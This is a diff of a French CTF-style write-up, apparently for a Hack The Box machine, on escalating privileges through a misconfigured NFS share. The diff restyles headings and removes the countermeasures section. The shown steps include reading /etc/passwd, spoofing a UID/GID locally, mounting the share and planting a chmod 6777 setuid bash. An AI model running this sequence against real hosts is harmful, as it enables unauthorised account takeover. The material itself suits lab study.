@@ -10,7 +10,7 @@ NFS (Network File System) est un protocole de partage de fichiers réseau. Sa fa
 
 ***
 
-### Prérequis
+### <mark style="color:green;">Prérequis</mark>
 
 * Accès à un shell sur une machine pouvant atteindre le serveur NFS
 * Un partage NFS monté avec l'option `rw` (lecture/écriture)
@@ -20,7 +20,7 @@ NFS (Network File System) est un protocole de partage de fichiers réseau. Sa fa
 
 ### <mark style="color:blue;">Étapes d'exploitation</mark>
 
-#### 1. Découverte du partage NFS
+#### <mark style="color:green;">1. Découverte du partage NFS</mark>
 
 ```bash
 showmount -e <IP_CIBLE>
@@ -33,7 +33,7 @@ L'option `*` signifie que le partage est accessible depuis **n'importe quelle IP
 
 ***
 
-#### 2. Identifier les utilisateurs cibles
+#### <mark style="color:green;">2. Identifier les utilisateurs cibles</mark>
 
 Sur la machine compromise, lire `/etc/passwd` pour trouver les UID intéressants :
 
@@ -45,7 +45,7 @@ cat /etc/passwd | grep -v nologin | grep -v false
 
 ***
 
-#### 3. Accéder au partage NFS (tunnel si nécessaire)
+#### <mark style="color:green;">3. Accéder au partage NFS (tunnel si nécessaire)</mark>
 
 Si le port NFS (2049) n'est pas directement accessible depuis votre machine, utilisez **Chisel** pour créer un tunnel :
 
@@ -63,7 +63,7 @@ Si le port NFS (2049) n'est pas directement accessible depuis votre machine, uti
 
 ***
 
-#### 4. Créer l'utilisateur usurpé sur Kali
+#### <mark style="color:green;">4. Créer l'utilisateur usurpé sur Kali</mark>
 
 ```bash
 # Créer le groupe avec le GID cible
@@ -82,7 +82,7 @@ sudo useradd -u 117 -g 120 -M -s /bin/bash fakeuser
 
 ***
 
-#### 5. Monter le partage NFS
+#### <mark style="color:green;">5. Monter le partage NFS</mark>
 
 ```bash
 sudo mount -t nfs -o vers=4,port=2049 localhost:/srv/web.fries.htb /mnt/target
@@ -91,7 +91,7 @@ ls -la /mnt/target
 
 ***
 
-#### 6. Créer un SUID bash via l'identité usurpée
+#### <mark style="color:green;">6. Créer un SUID bash via l'identité usurpée</mark>
 
 **Depuis la machine cible (en tant que l'utilisateur initial) :**
 
@@ -110,7 +110,7 @@ sudo -u fakeuser chmod 6777 /mnt/target/shared/shell_priv
 
 ***
 
-#### 7. Exécuter le shell SUID sur la cible
+#### <mark style="color:green;">7. Exécuter le shell SUID sur la cible</mark>
 
 ```bash
 cd /srv/web.fries.htb/shared
@@ -123,7 +123,7 @@ id              # uid=1000(svc) gid=1000(svc) euid=117(barman) egid=120(barman)
 
 ***
 
-### Schéma de l'attaque
+### <mark style="color:green;">Schéma de l'attaque</mark>
 
 ```
 Kali                          Cible (via NFS)
@@ -137,17 +137,3 @@ chmod 6777                    Bit SUID actif
 ```
 
 ***
-
-### Contre-mesures
-
-* Utiliser l'option `root_squash` (mappe root → nobody) et `all_squash` sur les partages NFS
-* Restreindre les partages à des IP spécifiques plutôt que `*`
-* Préférer NFSv4 avec Kerberos (`sec=krb5`) pour une authentification réelle
-* Éviter les partages NFS en écriture sur des chemins contenant des fichiers exécutables
-
-***
-
-### Références
-
-* [HackTricks - NFS no\_root\_squash/no\_all\_squash misconfiguration PE](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)
-* `man exports` — options de sécurité NFS
